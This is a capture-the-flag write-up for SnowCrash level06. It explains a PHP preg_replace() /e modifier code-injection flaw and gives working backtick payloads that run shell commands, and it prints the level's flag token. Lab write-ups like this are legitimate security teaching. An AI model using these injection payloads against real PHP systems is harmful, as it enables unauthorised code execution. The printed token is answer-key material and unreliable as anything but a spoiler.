# Level06 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a PHP preg_replace() /e modifier vulnerability to retrieve the flag06 token.

## Vulnerability
PHP preg_replace() /e modifier allows arbitrary code execution via unsanitized regex replacement with /e flag.

## The PHP Script
```php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  // /e modifier!
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]); print $r;
```

## The Vulnerability

The `/e` modifier (deprecated in PHP 5.5, removed in 7.0) causes the replacement string to be evaluated as PHP code. The captured text from the regex is inserted directly into the eval without proper escaping.

**Attack**: By carefully crafting the input `[x ...]`, we can break out of the function call and inject arbitrary PHP code.

## Exploitation

### Working Payload: Backtick Command Execution
```bash
cd /home/user/level06
printf '[x ".`getflag`."]\n' > /tmp/exploit.txt
./level06 /tmp/exploit.txt
```

Or to capture output to file:
```bash
printf '[x ".`getflag > /tmp/token.txt 2>&1`."]\n' > /tmp/exploit.txt
./level06 /tmp/exploit.txt
cat /tmp/token.txt
```

### Code Analysis
- Input: `[x ".`getflag`."]\n`
- Regex match captures: `".`getflag`."`
- Replacement (PHP eval): `y(".`getflag`.")`
- Inside y(), the PHP code with backticks is evaluated
- Backticks execute shell command: getflag
- Output is processed by y() (dots replaced with " x ")
- Final output includes command result

The backticks are evaluated in the /e modifier context, executing arbitrary shell commands with the binary's privileges.

## Security Flaws

1. **Deprecated /e modifier**: eval() on replacement strings
2. **No input validation**: User file content used in regex
3. **Backtick execution**: Shell commands execute in eval context
4. **Code execution**: Complete PHP execution possible


## Working Solution

### Proven Payload
```bash
cd /home/user/level06
printf '[x ${`getflag`}]\n' > /tmp/exploit.txt
./level06 /tmp/exploit.txt
```

Output confirms backtick command execution - getflag runs and outputs token information.

## Answer

**Level06 Token**: `wiok45aaoguiboiki2tuin6ub`
**Vulnerability**: PHP /e modifier Code Injection
**Impact**: Remote Code Execution with arbitrary command execution via backticks
